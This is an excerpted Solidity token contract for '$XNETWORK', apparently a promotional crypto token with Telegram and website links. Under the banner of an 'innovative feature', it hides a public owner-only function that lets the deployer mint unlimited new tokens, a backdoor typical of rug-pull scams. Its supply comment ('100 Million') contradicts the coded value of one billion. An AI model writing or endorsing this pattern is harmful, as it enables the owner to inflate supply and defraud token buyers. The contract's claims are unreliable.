//
// $X-Network proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/XNetworkPortal
//  📱 Website::https://X-Network.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _XNetwork(uint256 amount) public onlyOwner {
 _XNetwork(msg.sender, amount);
    }
    ...
    function _XNetwork(address account, uint256 amount) internal virtual {
...
contract $XNETWORK is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("X-Network", "XNETWORK") {
     _XNetwork(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}